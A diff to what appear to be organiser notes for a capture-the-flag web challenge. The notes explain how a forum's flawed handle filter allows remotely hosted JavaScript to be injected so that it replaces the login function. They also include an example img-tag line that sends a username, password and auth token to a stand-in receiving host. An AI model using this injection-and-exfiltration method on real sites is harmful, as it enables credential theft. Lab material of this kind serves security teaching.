@@ -25,9 +25,8 @@ Present the code to one of the hosts to win!
 The website is supposed to emulate a forum. Most forms of auth are secure *except* the `handle` which checks for `<script>` but not `<script src= . . .`. The challenger is supposed to inject some JS that replaces the login function with one that grabs the token or password. 
 
 ### Recommendation at this point
-My BIGGEST recommendation is to use https://gist.github.com/. Once there they can make something called `c.js` and put some arbituary JS code in it. once there, use the embed link[1] as their handle and voila! Injected JS that they **CAN EDIT ACTIVELY**. This way if they break the site they can just change their code here to revert it.
+My BIGGEST recommendation is to use https://gist.github.com/. Once there they can make something called `c.js` and put some arbituary JS code in it. once there, use the **RAW** link as their handle and voila! Injected JS that they **CAN EDIT ACTIVELY**. This way if they break the site they can just change their code here to revert it.
 
-[1] <img src="https://cloud.githubusercontent.com/assets/5258036/20909262/64a0e79c-bb0f-11e6-939c-217a391eb930.png">
 
 Once grabbed, it will then send it to a page that listens for any request and grabs the parameters. ( We might want to provide this ). To send it out, the easiest method is to bind it with an img tag. \<img src="https://mysecretwebsite.ioo/receive?user=admin&password=yadada&authToken=1234567">. 
 
